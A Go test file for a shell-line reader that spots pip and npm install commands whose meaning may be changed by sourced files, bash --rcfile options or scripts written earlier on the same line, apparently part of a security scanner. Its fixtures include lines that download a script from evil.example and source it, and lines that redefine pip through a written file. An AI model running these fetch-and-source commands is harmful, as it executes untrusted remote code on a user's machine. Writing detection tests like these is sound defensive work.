package installread

import (
	"slices"
	"strings"
	"testing"
)

// ADR-0159 round 20 (P2-I): a file the line loads can define the install's command. bash --rcfile and --init-file hold
// in the line reader; source FILE and . FILE on a line that installs are a fact for the server (SourcedFileNotRead,
// beside ReqFileNotRead), which holds nothing: alalanet-agent reads the file on the machine.
func TestReaderSourcedFiles(t *testing.T) {
	for line, want := range map[string][]string{
		"source .venv/bin/activate && pip install requests":                   {".venv/bin/activate"},
		"python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg": {".venv/bin/activate"},
		". ./evil.sh; pip install zz-pkg":                                     {"./evil.sh"},
		"builtin source -- ./evil.sh && npm i zz-pkg":                         {"./evil.sh"},
		"source a.sh && source b.sh && pip install zz-pkg":                    {"a.sh", "b.sh"},
		"source ./evil.sh && uv sync":                                         nil, // uv sync: no install the readers read (the server is not asked)
		"source ~/.bashrc && ls":                                              nil, // installs nothing
		"source /dev/stdin <<< x; pip install zz-pkg":                         nil, // its input: a definition (Defines)
		"pip install zz-pkg":                                                  nil,
		"source <(cat .env) && npx -y zz-pkg":                                 {SourcedOutput},
		"source; pip install zz-pkg":                                          nil,
	} {
		if got := SourcedFiles(line); !slices.Equal(got, want) {
			t.Errorf("SourcedFiles(%q) = %q, want %q", line, got, want)
		}
	}
	// the agent's per-command form
	for _, c := range Commands("source -- ./evil.sh; . x.sh a b; source; pip install zz-pkg") {
		if got, want := CommandSourcedFile(c), map[string]string{"source": "./evil.sh", ".": "x.sh"}[c.Prog]; got != want &&
			!(c.Prog == "source" && len(c.Words) == 1 && got == "") {
			t.Errorf("CommandSourcedFile(%q) = %q, want %q", c.Words, got, want)
		}
	}
	for line, want := range map[string][]string{
		"source .venv/bin/activate && pip install -r r.txt": {ReqFileNotRead, SourcedFileNotRead},
		"source ./evil.sh && pip install zz-pkg":            {SourcedFileNotRead},
		"pip install -r r.txt":                              {ReqFileNotRead},
		"pip install zz-pkg":                                nil,
		"source ./evil.sh && ls":                            nil,
	} {
		if got := LineFacts(line); !slices.Equal(got, want) {
			t.Errorf("LineFacts(%q) = %q, want %q", line, got, want)
		}
	}
	// the server's reading of the line is unchanged: the fact holds nothing
	for _, line := range []string{"source ./evil.sh && pip install zz-pkg", "source .venv/bin/activate && pip install requests"} {
		tg, un, _, subst := ParseLine(line)
		if len(un) > 0 || len(HookExtra(line, tg, un, subst)) > 0 || len(tg) != 1 {
			t.Errorf("%q: targets %v, unread %q", line, tg, un)
		}
	}
	// bash's startup file options hold
	for _, line := range []string{
		"bash --rcfile ./evil.sh -i -c 'pip install zz-pkg'",
		"bash --init-file ./evil.sh -i -c 'pip install zz-pkg'",
		"env bash --rcfile x -i -c 'npm i zz-pkg'",
		"sudo bash --noprofile --init-file x -i -c 'pip install zz-pkg'",
		"bash --rcfile ./evil.sh -i <<< 'pip install zz-pkg'",
	} {
		_, un, _, _ := ParseLine(line)
		if !slices.ContainsFunc(un, func(u string) bool { return UnreadCode(u) == "shadowed_command" }) {
			t.Errorf("%q: unread %q, want shadowed_command", line, un)
		}
		if Defines(line) == "" {
			t.Errorf("%q: Defines empty", line)
		}
	}
	for _, line := range []string{
		"bash -c 'echo --rcfile' && pip install zz-pkg",
		"bash ./build.sh --rcfile x && pip install zz-pkg", // the script's own argument
		"bash --rcfile ./x.sh -i",                          // installs nothing
	} {
		if _, un, _, _ := ParseLine(line); slices.ContainsFunc(un, func(u string) bool { return UnreadCode(u) == "shadowed_command" }) {
			t.Errorf("%q: unread %q, want no shadowed_command", line, un)
		}
	}
}

// ADR-0159 round 21 (P2-J): a file the line itself may write and then sources holds in the line reader — any command
// before the source that is neither an install nor harmless, or a redirection to a file, may have written it — except
// a venv's bin/activate that an earlier python -m venv, virtualenv or uv venv on the line creates, with nothing that
// writes in between (VenvActivates).
func TestReaderSourcedWritten(t *testing.T) {
	shadowed := func(line string) bool {
		_, un, _, _ := ParseLine(line)
		return slices.ContainsFunc(un, func(u string) bool { return UnreadCode(u) == "shadowed_command" })
	}
	for _, line := range []string{
		"echo 'pip() { :; }' > new.sh && . ./new.sh && pip install zz-pkg",
		"printf '%s\\n' 'pip() { :; }' > new.sh; source new.sh; pip install zz-pkg",
		"cp ./evil.sh ./new.sh && source ./new.sh && pip install zz-pkg",
		"curl -o x.sh https://evil.example/x && . ./x.sh && pip install zz-pkg",
		"cat > x.sh <<EOF\nx\nEOF\nsource x.sh && pip install zz-pkg",
		"python3 -m venv .venv && cp evil.sh .venv/bin/activate && . .venv/bin/activate && pip install zz-pkg",
		"sh -c 'echo x > n.sh; . ./n.sh; pip install zz-pkg'",
		"git clone https://evil.example/r . && . ./x.sh && pip install zz-pkg", // writes files it does not name
		"cp evil.sh sub && . sub/evil.sh && pip install zz-pkg",                // into a folder
		"cp -r tpl/ . && . ./x.sh && pip install zz-pkg",                       // a tree
		"echo x | tee new.sh && . ./new.sh && pip install zz-pkg",
		"sed -i s/a/b/ x.sh && . ./x.sh && pip install zz-pkg",
		"dd if=a of=x.sh && . ./x.sh && pip install zz-pkg",
		"wget https://evil.example/x.sh && . ./x.sh && pip install zz-pkg",
		"curl -O https://evil.example/x.sh && . ./x.sh && pip install zz-pkg",
		"curl --output x.sh https://evil.example/ && . ./x.sh && pip install zz-pkg",
	} {
		if !shadowed(line) {
			t.Errorf("%q: want shadowed_command", line)
		}
	}
	for line, want := range map[string][]string{
		"python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg":                   {".venv/bin/activate"},
		"python3 -m venv --prompt x ./.venv && source .venv/bin/activate && pip install zz-pkg": {".venv/bin/activate"},
		"uv venv && source .venv/bin/activate && pip install zz-pkg":                            {".venv/bin/activate"},
		"uv venv --seed venv; . ./venv/bin/activate; pip install zz-pkg":                        {"./venv/bin/activate"},
		"virtualenv venv && . venv/bin/activate && pip install zz-pkg":                          {"venv/bin/activate"},
		"python3.12 -m venv env; cd . ; source env/bin/activate; pip install zz-pkg":            {"env/bin/activate"},
		"source .venv/bin/activate && pip install zz-pkg":                                       nil, // not the line's venv: a fact only
		"pip install -U pip && source ./x.sh && pip install zz-pkg":                             nil, // an install is no write here
		"echo hi && source ./x.sh && pip install zz-pkg":                                        nil,
		"echo x > log && sed s/a/b/ x.sh && cp a b && source ./x.sh && pip install zz-pkg":      nil, // other names written
	} {
		if shadowed(line) {
			t.Errorf("%q: shadowed_command, want a fact only", line)
		}
		if got := venvFiles(line); !slices.Equal(got, want) {
			t.Errorf("VenvActivates(%q) = %q, want %q", line, got, want)
		}
	}
	for line, want := range map[string][]string{
		"source ./a.sh && pip install zz-pkg":                          {"./a.sh"},
		"cd x && echo hi && source ./a.sh && source ./b.sh":            {"./a.sh"}, // a sourced file may write
		"pip install zz-pkg && source ./a.sh":                          {"./a.sh"}, // an install the readers read is checked
		"make && source ./a.sh && pip install zz-pkg":                  nil,
		"python3 -m venv .venv && source ./a.sh && pip install zz-pkg": {"./a.sh"}, // a venv tool writes only its venv
		"echo x > a.sh; source ./a.sh; pip install zz-pkg":             nil,
	} {
		if got := SourcedUnwritten(line); !slices.Equal(got, want) {
			t.Errorf("SourcedUnwritten(%q) = %q, want %q", line, got, want)
		}
	}
	// no venv of the line's own (an interpreter or a folder it chooses, another file): a fact here; the agent holds on
	// the file when it is not there
	for _, line := range []string{
		"python3 -m venv .venv && cp evil.sh .venv/bin/activate && . .venv/bin/activate && pip install zz-pkg",
		"python3 -m venv .venv && . .venv/bin/x && pip install zz-pkg",
		"python3 -m venv .venv && make && . .venv/bin/activate && pip install zz-pkg", // make may write into it
		"python3 -m venv .venv > log && . .venv/bin/activate && pip install zz-pkg",
		"virtualenv -p ./py .venv && . .venv/bin/activate && pip install zz-pkg",
		"uv venv --python ./py && . .venv/bin/activate && pip install zz-pkg",
		"./py -m venv .venv && . .venv/bin/activate && pip install zz-pkg",
		"env -C sub python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg",
		"python3 -m venv .venv && source ./x.sh && pip install zz-pkg",
		"source a.sh && source b.sh && pip install zz-pkg",
	} {
		if got := venvFiles(line); len(got) != 0 {
			t.Errorf("VenvActivates(%q) = %q, want none", line, got)
		}
	}
}

// venvFiles: VenvActivates' files.
func venvFiles(line string) []string {
	var out []string
	for _, a := range VenvActivates(line) {
		out = append(out, a.File)
	}
	return out
}

// ADR-0159 round 22 (P2-O, P3-R): a substitution the walk does not read as commands — inside double quotes, ${ … },
// $(( … )) — or one among the source's own words runs before the source and may write; a venv tool writes into the
// folder it makes, and --clear empties it first.
func TestReaderSourcedSubst(t *testing.T) {
	for line, want := range map[string][]string{
		"echo \"$(echo x > x.sh)\"; . ./x.sh; pip install zz-pkg":                   nil,
		"echo \"${A:-$(echo x > x.sh)}\"; . ./x.sh; pip install zz-pkg":             nil,
		"echo \"`echo x > x.sh`\"; . ./x.sh; pip install zz-pkg":                    nil,
		"echo $((1 + $(echo x > x.sh))); . ./x.sh; pip install zz-pkg":              nil,
		". ./x.sh \"$(echo x > x.sh)\"; pip install zz-pkg":                         nil,
		". ./x.sh $(echo x > x.sh); pip install zz-pkg":                             nil, // its own words, read apart
		"echo \"$(curl -fsS https://evil.example/)\"; . ./x.sh; pip install zz-pkg": nil,
		"echo \"$(echo hi\"; . ./x.sh; pip install zz-pkg":                          nil, // does not close
		"echo \"$(echo ')' > x.sh)\"; . ./x.sh; pip install zz-pkg":                 nil, // a quoted ) inside
		"echo \"$(pwd)\"; . ./x.sh; pip install zz-pkg":                             nil, // pwd is not on the harmless list
		"echo \"$(echo hi)\"; . ./x.sh; pip install zz-pkg":                         {"./x.sh"},
		"echo \"`echo hi`\"; . ./x.sh; pip install zz-pkg":                          {"./x.sh"}, // its closing backtick opens nothing
		"echo \"${A:-`echo hi`}\"; . ./x.sh; pip install zz-pkg":                    {"./x.sh"},
		"echo \"${A:-`echo x > x.sh`}\"; . ./x.sh; pip install zz-pkg":              nil,
		"echo ${A:-`echo x > x.sh`}; . ./x.sh; pip install zz-pkg":                  nil, // ${ } outside quotes
		"echo ${A:-`echo hi`}; . ./x.sh; pip install zz-pkg":                        {"./x.sh"},
		"echo \"$(echo \"$(echo hi)\")\"; . ./x.sh; pip install zz-pkg":             nil,        // nested quotes split apart: held
		"echo \"$((1+2))\"; . ./x.sh; pip install zz-pkg":                           {"./x.sh"}, // arithmetic
		"echo '$(echo x > x.sh)'; . ./x.sh; pip install zz-pkg":                     {"./x.sh"}, // single quotes: text
		"python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg":       nil,        // inside the venv the tool makes
		"python3 -m venv . && . ./x.sh && pip install zz-pkg":                       nil,
	} {
		if got := SourcedUnwritten(line); !slices.Equal(got, want) {
			t.Errorf("SourcedUnwritten(%q) = %q, want %q", line, got, want)
		}
	}
	// the line reader: a write by name inside a quoted substitution
	if _, un, _, _ := ParseLine("echo \"$(echo x > x.sh)\"; . ./x.sh; pip install zz-pkg"); !slices.ContainsFunc(un,
		func(u string) bool { return UnreadCode(u) == "shadowed_command" }) {
		t.Errorf("a quoted write by name: %q", un)
	}
	for line, want := range map[string]bool{
		"python3 -m venv .venv && . .venv/bin/activate && pip install zz-pkg":               false,
		"python3 -m venv --clear .venv && . .venv/bin/activate && pip install zz-pkg":       true,
		"virtualenv --clear venv && . venv/bin/activate && pip install zz-pkg":              true,
		"uv venv --clear && . .venv/bin/activate && pip install zz-pkg":                     true,
		"python3 -m venv --without-pip .venv && . .venv/bin/activate && pip install zz-pkg": false,
	} {
		got := VenvActivates(line)
		if len(got) != 1 || got[0].Clear != want {
			t.Errorf("VenvActivates(%q) = %+v, want Clear %v", line, got, want)
		}
	}
}

// ADR-0159 round 23 (P2-P, P2-Q): a quoted substitution's end is found by the tokenizer's own count of parentheses
// and single quotes; a body that holds a here-document, a comment, a new line or a case — whose ")" the count cannot
// place — is a write; past maxSubsts substitutions, maxSubstDepth nested, or the walk's byte budget, the line holds a
// write; a line past MaxLineBytes is not read and holds.
func TestReaderSubstBounds(t *testing.T) {
	flat := func(n int) string {
		return "echo \"" + strings.Repeat("$(true) ", n) + "\"; . ./x.sh; pip install zz-pkg"
	}
	nested := func(n int) string {
		return "echo \"" + strings.Repeat("$(echo ", n) + "hi" + strings.Repeat(")", n) + "\"; . ./x.sh; pip install zz-pkg"
	}
	for line, want := range map[string][]string{
		"echo \"$(cat <<'E'\n)\nE\ncp ./e.sh x.sh)\"; . ./x.sh; pip install zz-pkg":                                                          nil, // a here-document
		"echo \"$(# )\ncp ./e.sh x.sh)\"; . ./x.sh; pip install zz-pkg":                                                                      nil, // a comment
		"echo \"$(case a in a) cp ./e.sh x.sh;; esac)\"; . ./x.sh; pip install zz-pkg":                                                       nil,
		"echo \"a $(echo ')' ; cp ./e.sh x.sh) b\"; . ./x.sh; pip install zz-pkg":                                                            nil, // a ) in single quotes
		"echo \"$(echo 'a)b')\"; . ./x.sh; pip install zz-pkg":                                                                               {"./x.sh"},
		"echo \"$(echo $((1+2)))\"; . ./x.sh; pip install zz-pkg":                                                                            nil,        // round 25: a $ in a body is a write
		"echo \"$(echo $((1+2)) > x.sh)\"; . ./x.sh; pip install zz-pkg":                                                                     nil,        // the write after its own parentheses
		"echo \"$(echo lowercase)\"; . ./x.sh; pip install zz-pkg":                                                                           {"./x.sh"}, // case as a word only
		"echo ${X:-$(echo hi)}; . ./x.sh; pip install zz-pkg":                                                                                {"./x.sh"}, // ${ }: the $( paren is the opener's
		"echo ${X:-$(echo ')' > x.sh)}; . ./x.sh; pip install zz-pkg":                                                                        nil,        // ${ }: a ) in single quotes
		"echo ${X:-$(echo hi}; . ./x.sh; pip install zz-pkg":                                                                                 nil,        // ${ } ends with a $( open
		"echo \"$(echo '$(')\"; . ./x.sh; pip install zz-pkg":                                                                                nil,        // round 25: a $ is off the list, in single quotes too
		"echo \"$(echo ${X:-$(echo " + strings.Repeat("a", 30000) + ")} " + strings.Repeat("b", 20000) + ")\"; . ./x.sh; pip install zz-pkg": nil,        // one budget
		"echo \"$(echo \\) ; cp ./e.sh x.sh)\"; . ./x.sh; pip install zz-pkg":                                                                nil,        // round 24: an escaped )
		"echo \"$(echo $'\\')' ; cp ./e.sh x.sh)\"; . ./x.sh; pip install zz-pkg":                                                            nil,        // $'…' with \'
		"echo ${X:-$(echo \\) ; cp ./e.sh x.sh)}; . ./x.sh; pip install zz-pkg":                                                              nil,
		"echo \"$(printf '%s\\n' a)\"; . ./x.sh; pip install zz-pkg":                                                                         nil,        // any backslash: a write
		"echo \"$(echo $'a')\"; . ./x.sh; pip install zz-pkg":                                                                                nil,        // any $': a write
		"echo \"$(echo ())\"; . ./x.sh; pip install zz-pkg":                                                                                  {"./x.sh"}, // a plain body with its own parentheses
		flat(maxSubsts):           {"./x.sh"},
		flat(maxSubsts + 1):       nil, // past the count
		nested(maxSubstDepth):     nil, // round 25: a $ in a body is no plain text
		nested(maxSubstDepth + 1): nil, // past the depth
		"echo \"$(echo " + strings.Repeat("a", maxSubstWalk) + ")\"; . ./x.sh; pip install zz-pkg": nil, // past the budget
		"echo \"$(echo " + strings.Repeat("a", 1000) + ")\"; . ./x.sh; pip install zz-pkg":         {"./x.sh"},
	} {
		if got := SourcedUnwritten(line); !slices.Equal(got, want) {
			t.Errorf("SourcedUnwritten(%q) = %q, want %q", clip(line, 80), got, want)
		}
	}
	// the depth bound, through the line reader's write by name: within it the innermost body is read for its names
	named := func(n int) string {
		return "echo \"" + strings.Repeat("$(echo ", n-1) + "$(echo x > x.sh" + strings.Repeat(")", n) + "\"; . ./x.sh; pip install zz-pkg"
	}
	shadowed := func(line string) bool {
		_, un, _, _ := ParseLine(line)
		return slices.ContainsFunc(un, func(u string) bool { return UnreadCode(u) == "shadowed_command" })
	}
	if !shadowed(named(maxSubstDepth)) || shadowed(named(maxSubstDepth+1)) {
		t.Errorf("the depth bound: %v at %d, %v at %d", shadowed(named(maxSubstDepth)), maxSubstDepth,
			shadowed(named(maxSubstDepth+1)), maxSubstDepth+1)
	}
	long := "pip install zz-pkg # " + strings.Repeat("a", MaxLineBytes)
	if tg, un, _, _ := ParseLine(long); len(tg) != 0 || len(un) != 1 || !strings.Contains(un[0], "longer than alalanet reads") {
		t.Errorf("a line past the cap: %v %q", tg, un)
	}
	if Commands(long) != nil || RequirementFiles(long+" -r r.txt") != nil || SourcedFiles(". x; "+long) != nil ||
		Defines("pip() { :; }; "+long) != "" || HookExtra("PATH=./bin:$PATH npx -y zz-pkg; "+long, nil, nil, false) != nil || OtherProgram("curl x; "+long) != "" ||
		VenvActivates(long) != nil || SourcedUnwritten(". x; "+long) != nil {
		t.Error("a reader read a line past the cap")
	}
	if tg, _, _, _ := ParseLine("pip install zz-pkg # " + strings.Repeat("a", MaxLineBytes-30)); len(tg) != 1 {
		t.Errorf("a line under the cap: %v", tg)
	}
}

// ADR-0159 round 25 (P2-S): the allowlist a substitution body must keep to for its count to be trusted.
func TestSubstPlain(t *testing.T) {
	for body, want := range map[string]bool{
		"pwd": true, "date +%Y-%m-%d": true, "git rev-parse --short HEAD": true, "echo 'a)b'": true,
		"basename a/b.c": true, "echo (a)": true, "printf '%s;|&' x": false, "echo '(a'": true, "id -u user@host:1,2=3": true,
		"echo $x": false, "echo ${X:-)}": false, `echo ")"`: false, "echo `x`": false, "a|b": false, "a;b": false,
		"a&b": false, "a>b": false, "a<b": false, "a #b": false, `a\b`: false, "a\nb": false, "echo 'a": false,
		"echo )(": false, "{": false, "}": false, "ls *": false, "echo 'a\nb'": false, "echo ((a)": false,
	} {
		if got := substPlain(body); got != want {
			t.Errorf("substPlain(%q) = %v, want %v", body, got, want)
		}
	}
}
